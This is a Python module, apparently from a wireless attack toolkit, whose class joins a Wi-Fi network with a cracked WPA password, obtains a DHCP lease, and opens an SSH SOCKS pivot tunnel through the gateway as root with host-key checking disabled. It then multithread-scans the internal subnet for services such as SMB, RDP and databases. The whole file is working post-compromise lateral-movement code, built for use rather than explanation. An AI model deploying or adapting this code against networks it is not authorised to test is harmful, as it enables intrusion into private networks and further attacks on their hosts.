"""
Auto-Pivot with Cracked Credentials
------------------------------------
After a WPA password is cracked/verified:
  1. Connect to target AP using wpa_supplicant
  2. Obtain DHCP lease via dhclient
  3. Set up SSH SOCKS tunnel for pivoting
  4. Scan internal subnet for services

Enables automatic lateral movement after initial credential capture.
"""

import os
import time
import socket
import subprocess
import threading

from .config import log


class AutoPivot:
    """
    Automatically pivot into a network after obtaining valid credentials.

    Connects to target AP, obtains network access, establishes a SOCKS
    tunnel, and performs internal reconnaissance.
    """

    def __init__(self, interface, ssh_port=1080, scan_timeout=2):
        self.interface = interface
        self.ssh_port = ssh_port
        self.scan_timeout = scan_timeout

        self._running = False
        self._connected = False
        self._tunnel_proc = None
        self._wpa_proc = None
        self._local_ip = None
        self._gateway_ip = None
        self._subnet = None
        self._discovered_services = []
        self._lock = threading.Lock()

    def pivot(self, ssid, password, interface=None):
        """
        Connect to target AP and establish network access.

        Args:
            ssid: Target AP SSID
            password: WPA password (cracked or captured)
            interface: Override interface (defaults to self.interface)

        Returns:
            True if connection successful, False otherwise
        """
        iface = interface or self.interface
        self._running = True

        log.info(f"Auto-pivot: Connecting to '{ssid}' on {iface}...")

        # Create wpa_supplicant config
        config_path = f"/tmp/pivot_wpa_{int(time.time())}.conf"
        try:
            with open(config_path, "w") as f:
                f.write("ctrl_interface=/var/run/wpa_supplicant\n")
                f.write("ap_scan=1\n\n")
                f.write("network={\n")
                f.write(f'    ssid="{ssid}"\n')
                f.write(f'    psk="{password}"\n')
                f.write("    key_mgmt=WPA-PSK\n")
                f.write("}\n")
            # Restrict permissions - config contains sensitive PSK
            os.chmod(config_path, 0o600)
        except OSError as e:
            log.error(f"Failed to write wpa config: {e}")
            return False

        # Set interface to managed mode
        try:
            subprocess.run(
                ["ip", "link", "set", iface, "down"],
                capture_output=True, timeout=5
            )
            subprocess.run(
                ["iw", "dev", iface, "set", "type", "managed"],
                capture_output=True, timeout=5
            )
            subprocess.run(
                ["ip", "link", "set", iface, "up"],
                capture_output=True, timeout=5
            )
        except (subprocess.TimeoutExpired, OSError) as e:
            log.error(f"Failed to configure interface: {e}")
            return False

        # Start wpa_supplicant
        try:
            self._wpa_proc = subprocess.Popen(
                ["wpa_supplicant", "-i", iface, "-c", config_path, "-B"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        except (OSError, FileNotFoundError) as e:
            log.error(f"Failed to start wpa_supplicant: {e}")
            return False

        # Wait for association
        connected = False
        for attempt in range(20):
            if not self._running:
                break
            try:
                result = subprocess.run(
                    ["iwconfig", iface],
                    capture_output=True, text=True, timeout=5
                )
                if "Not-Associated" not in result.stdout and ssid in result.stdout:
                    connected = True
                    break
            except (subprocess.TimeoutExpired, OSError):
                pass
            time.sleep(1)

        if not connected:
            log.error(f"Failed to associate with '{ssid}'")
            self._cleanup_config(config_path)
            return False

        log.info(f"Associated with '{ssid}', requesting DHCP...")

        # Obtain DHCP lease
        try:
            subprocess.run(
                ["dhclient", "-v", iface],
                capture_output=True, timeout=30
            )
        except (subprocess.TimeoutExpired, OSError) as e:
            log.warning(f"DHCP request issue: {e}")

        # Get local IP and gateway
        self._local_ip = self._get_local_ip(iface)
        self._gateway_ip = self._get_gateway(iface)

        if self._local_ip:
            # Determine subnet from IP
            parts = self._local_ip.split(".")
            if len(parts) == 4:
                self._subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

            self._connected = True
            log.info(f"Auto-pivot connected: IP={self._local_ip}, "
                     f"Gateway={self._gateway_ip}, Subnet={self._subnet}")

            self._cleanup_config(config_path)
            return True

        log.error("Failed to obtain IP address")
        self._cleanup_config(config_path)
        return False

    def setup_tunnel(self, gateway_ip, ssh_user="root", ssh_pass=None,
                     local_port=None):
        """
        Set up a SSH SOCKS proxy tunnel through the gateway.

        Args:
            gateway_ip: IP of the SSH server to tunnel through
            ssh_user: SSH username (default: root)
            ssh_pass: SSH password (optional, uses key if None)
            local_port: Local SOCKS port (default: self.ssh_port)

        Returns:
            True if tunnel established, False otherwise
        """
        port = local_port or self.ssh_port

        log.info(f"Setting up SOCKS tunnel via {gateway_ip}:{port}...")

        cmd = [
            "ssh", "-D", str(port),
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=10",
            "-o", "ServerAliveInterval=30",
            "-N", "-f",
            f"{ssh_user}@{gateway_ip}"
        ]

        try:
            if ssh_pass:
                cmd = ["sshpass", "-p", ssh_pass] + cmd

            self._tunnel_proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
            )

            # Give tunnel time to establish
            time.sleep(3)

            # Verify tunnel is listening
            if self._is_port_open("127.0.0.1", port):
                log.info(f"SOCKS tunnel active on localhost:{port}")
                return True
            else:
                log.warning("Tunnel process started but port not listening")
                return False

        except (OSError, FileNotFoundError) as e:
            log.error(f"Failed to establish tunnel: {e}")
            return False

    def scan_internal(self, subnet=None, ports=None):
        """
        Scan internal subnet for common services.

        Args:
            subnet: CIDR subnet to scan (default: auto-detected)
            ports: List of ports to scan (default: common services)

        Returns:
            List of discovered services as dicts
        """
        target_subnet = subnet or self._subnet
        if not target_subnet:
            log.error("No subnet to scan")
            return []

        if ports is None:
            ports = [22, 80, 443, 445, 3389, 8080, 8443, 3306, 5432, 1433,
                     21, 23, 25, 110, 143, 389, 636, 5900, 6379, 27017]

        log.info(f"Scanning internal subnet {target_subnet} "
                 f"({len(ports)} ports)...")

        # Parse subnet to get host range
        hosts = self._parse_subnet(target_subnet)
        discovered = []

        threads = []
        for host in hosts:
            if not self._running:
                break
            t = threading.Thread(
                target=self._scan_host, args=(host, ports, discovered),
                daemon=True
            )
            t.start()
            threads.append(t)

            # Limit concurrent scans
            if len(threads) >= 20:
                for tt in threads:
                    tt.join(timeout=self.scan_timeout + 2)
                threads = []

        # Wait for remaining threads
        for t in threads:
            t.join(timeout=self.scan_timeout + 2)

        with self._lock:
            self._discovered_services = discovered

        log.info(f"Internal scan complete: {len(discovered)} services found")
        return discovered

    def _scan_host(self, host, ports, results):
        """Scan a single host for open ports."""
        for port in ports:
            if not self._running:
                return
            if self._is_port_open(host, port):
                service = self._identify_service(port)
                entry = {
                    "host": host,
                    "port": port,
                    "service": service,
                    "timestamp": time.time()
                }
                with self._lock:
                    results.append(entry)
                log.debug(f"Found {service} at {host}:{port}")

    def _is_port_open(self, host, port):
        """Check if a TCP port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.scan_timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except (socket.error, OSError):
            return False

    def _identify_service(self, port):
        """Map common port numbers to service names."""
        services = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
            53: "dns", 80: "http", 110: "pop3", 143: "imap",
            389: "ldap", 443: "https", 445: "smb", 636: "ldaps",
            1433: "mssql", 3306: "mysql", 3389: "rdp",
            5432: "postgresql", 5900: "vnc", 6379: "redis",
            8080: "http-proxy", 8443: "https-alt", 27017: "mongodb",
        }
        return services.get(port, f"unknown-{port}")

    def _parse_subnet(self, subnet):
        """Parse CIDR subnet into list of host IPs (max 254)."""
        hosts = []
        try:
            if "/" in subnet:
                base, prefix = subnet.split("/")
                parts = base.split(".")
                if len(parts) == 4 and int(prefix) == 24:
                    for i in range(1, 255):
                        hosts.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
            else:
                hosts.append(subnet)
        except (ValueError, IndexError):
            pass
        return hosts

    def _get_local_ip(self, interface):
        """Get local IP address for an interface."""
        try:
            result = subprocess.run(
                ["ip", "-4", "addr", "show", interface],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                line = line.strip()
                if line.startswith("inet "):
                    ip = line.split()[1].split("/")[0]
                    return ip
        except (subprocess.TimeoutExpired, OSError):
            pass
        return None

    def _get_gateway(self, interface):
        """Get default gateway for an interface."""
        try:
            result = subprocess.run(
                ["ip", "route", "show", "dev", interface],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "default" in line:
                    parts = line.split()
                    idx = parts.index("via") if "via" in parts else -1
                    if idx >= 0 and idx + 1 < len(parts):
                        return parts[idx + 1]
        except (subprocess.TimeoutExpired, OSError, ValueError):
            pass
        return None

    def _cleanup_config(self, config_path):
        """Remove temporary config file."""
        try:
            os.remove(config_path)
        except OSError:
            pass

    def stop(self):
        """Stop all pivot operations and cleanup."""
        self._running = False
        self._connected = False

        # Kill SSH tunnel
        if self._tunnel_proc:
            try:
                self._tunnel_proc.terminate()
                self._tunnel_proc.wait(timeout=5)
            except (OSError, subprocess.TimeoutExpired):
                try:
                    self._tunnel_proc.kill()
                except OSError:
                    pass
            self._tunnel_proc = None

        # Kill wpa_supplicant
        if self._wpa_proc:
            try:
                self._wpa_proc.terminate()
            except OSError:
                pass
            self._wpa_proc = None

        # Release DHCP
        try:
            subprocess.run(
                ["dhclient", "-r", self.interface],
                capture_output=True, timeout=5
            )
        except (subprocess.TimeoutExpired, OSError):
            pass

        log.info("Auto-pivot stopped and cleaned up")

    def get_stats(self):
        """Return pivot status and statistics."""
        return {
            "connected": self._connected,
            "local_ip": self._local_ip,
            "gateway_ip": self._gateway_ip,
            "subnet": self._subnet,
            "tunnel_active": self._tunnel_proc is not None,
            "services_discovered": len(self._discovered_services),
            "running": self._running,
        }
